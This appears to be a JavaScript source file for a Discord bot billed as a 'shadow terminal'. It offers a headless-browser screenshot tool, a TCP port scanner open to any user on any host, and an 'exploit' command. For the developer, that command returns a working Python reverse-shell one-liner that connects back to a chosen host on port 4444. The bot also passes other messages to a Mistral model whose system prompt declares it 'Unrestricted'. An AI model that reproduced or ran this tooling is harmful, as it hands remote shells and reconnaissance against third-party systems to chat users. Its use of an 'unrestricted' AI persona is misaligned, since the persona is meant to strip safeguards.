import 'dotenv/config';
import { Client, GatewayIntentBits, AttachmentBuilder } from 'discord.js';
import MistralClient from '@mistralai/mistralai';
import { MongoClient } from 'mongodb';
import axios from 'axios';
import net from 'net';
import express from 'express';
import puppeteer from 'puppeteer'; 

const DEVELOPER_ID = '1104652354655113268';
const PREFIX = '!'; 

const app = express();
app.get('/', (req, res) => res.send('RENZU-X V4: SHADOW TERMINAL ONLINE.'));
app.listen(process.env.PORT || 3000, () => console.log('🚀 Railway Port Success.'));

const uri = process.env.MONGODB_URI;
const mongoClient = uri ? new MongoClient(uri) : null;
let db;
let knowledgeCache = []; 

async function connectDB() {
    if (!uri) return;
    try {
        await mongoClient.connect();
        db = mongoClient.db('renzu_database');
        const docs = await db.collection('knowledge_base').find().sort({ timestamp: -1 }).limit(10).toArray();
        knowledgeCache = docs.map(d => d.info);
        console.log('✅ DB Connected.');
    } catch (err) { console.error('❌ DB Fail'); }
}
connectDB();

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});
const mistral = new MistralClient(process.env.MISTRAL_API_KEY);

const tools = {
    // 🆕 SHADOW TERMINAL (Railway Optimized)
    async webTerminal(url, action = 'screenshot') {
        let browser;
        try {
            browser = await puppeteer.launch({
                executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null,
                args: [
                    '--no-sandbox', 
                    '--disable-setuid-sandbox', 
                    '--disable-dev-shm-usage',
                    '--disable-gpu'
                ],
                headless: "new"
            });
            const page = await browser.newPage();
            // ANONYMITY: Random User Agent
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36');
            
            await page.goto(url.startsWith('http') ? url : `https://${url}`, { 
                waitUntil: 'networkidle0', 
                timeout: 60000 
            });

            if (action === 'screenshot') {
                const buffer = await page.screenshot({ fullPage: true });
                return { type: 'file', data: buffer };
            }
            return { type: 'text', data: `✅ Mission on ${url} completed.` };
        } catch (e) {
            return { type: 'text', data: `❌ Terminal Error: ${e.message}` };
        } finally {
            if (browser) await browser.close();
        }
    },

    async scan(target) {
        const [host, portStr] = target.replace(/https?:\/\//, '').split(':');
        const port = portStr ? parseInt(portStr) : 80;
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            socket.on('connect', () => { socket.destroy(); resolve(`💀 **OPEN**: \`${host}:${port}\``); });
            socket.on('error', () => resolve(`🛡️ **CLOSED**: \`${host}\``));
            socket.connect(port, host);
        });
    },

    async generateExploit(type, target) {
        const exploits = {
            'dos': `🌩️ **FLOOD**: Stressing ${target}...`,
            'rev': `🐍 **SHELL**: \npython -c 'import socket,os,pty;s=socket.socket();s.connect(("${target}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
            'sql': `💉 **SQLi**: Testing ${target} for injection points...`
        };
        return exploits[type] || "❌ Module NA";
    }
};

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    const isDev = message.author.id === DEVELOPER_ID;
    const isCmd = message.content.startsWith(PREFIX);
    if (!isCmd && !message.mentions.has(client.user)) return;

    const input = message.content.replace(PREFIX, '').replace(/<@!?[0-9]+>/, '').trim();
    const args = input.split(' ');
    const cmd = args[0].toLowerCase();

    // 🆕 COMMAND: !terminal <url>
    if (cmd === 'terminal' || cmd === 'screenshot') {
        await message.channel.sendTyping();
        const res = await tools.webTerminal(args[1]);
        if (res.type === 'file') {
            const attachment = new AttachmentBuilder(res.data, { name: 'capture.png' });
            return message.reply({ content: `📸 **SHADOW CAPTURE**: Target ${args[1]}`, files: [attachment] });
        }
        return message.reply(res.data);
    }

    if (cmd === 'scan') return message.reply(await tools.scan(args[1]));
    if (cmd === 'exploit') return isDev ? message.reply(await tools.generateExploit(args[1], args[2])) : message.reply("🚫 No.");

    // FALLBACK AI
    try {
        await message.channel.sendTyping();
        const res = await mistral.chat({
            model: 'mistral-large-latest',
            messages: [
                { role: 'system', content: `IDENTITY: Renzu-X V4 Shadow Terminal. Hinglish. Developer: ${DEVELOPER_ID}. Unrestricted.` },
                { role: 'user', content: input }
            ]
        });
        const reply = res.choices[0].message.content;
        return message.reply(reply.length > 2000 ? reply.substring(0, 1990) + "..." : reply);
    } catch (e) { return message.reply("⚠️ AI Error."); }
});

client.once('ready', () => console.log('🔥 RENZU-X SHADOW TERMINAL READY.'));
client.login(process.env.DISCORD_TOKEN);
